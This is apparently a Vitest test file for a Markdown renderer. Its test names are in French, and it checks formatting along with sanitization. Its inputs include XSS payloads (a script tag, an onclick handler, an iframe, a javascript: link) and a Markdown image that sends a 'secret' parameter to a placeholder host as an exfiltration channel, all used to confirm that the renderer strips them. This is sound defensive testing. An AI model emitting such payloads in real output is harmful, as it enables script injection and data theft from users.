import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

describe('renderMarkdown', () => {
  it('interprète le gras, l’italique et les listes', () => {
    const html = renderMarkdown('1. **Simplifier** une *procédure*\n2. Lister les pièces')
    expect(html).toContain('<ol>')
    expect(html).toContain('<strong>Simplifier</strong>')
    expect(html).toContain('<em>procédure</em>')
  })

  it('retire le script, les gestionnaires d’événements et le HTML brut', () => {
    const html = renderMarkdown('<script>alert(1)</script><b onclick="x()">gras</b><iframe src="https://x"></iframe>')
    expect(html).not.toMatch(/<script|onclick|<iframe|<b[ >]/)
  })

  it('n’affiche aucune image, même distante (canal d’exfiltration)', () => {
    const html = renderMarkdown('![x](https://exemple.invalid/?d=secret) <img src="https://exemple.invalid/a.png">')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('exemple.invalid')
  })

  it('ouvre les liens dans un nouvel onglet et refuse javascript:', () => {
    const html = renderMarkdown('[service-public](https://www.service-public.fr) [piège](javascript:alert(1))')
    expect(html).toContain('href="https://www.service-public.fr"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
    expect(html).not.toContain('javascript:')
  })
})
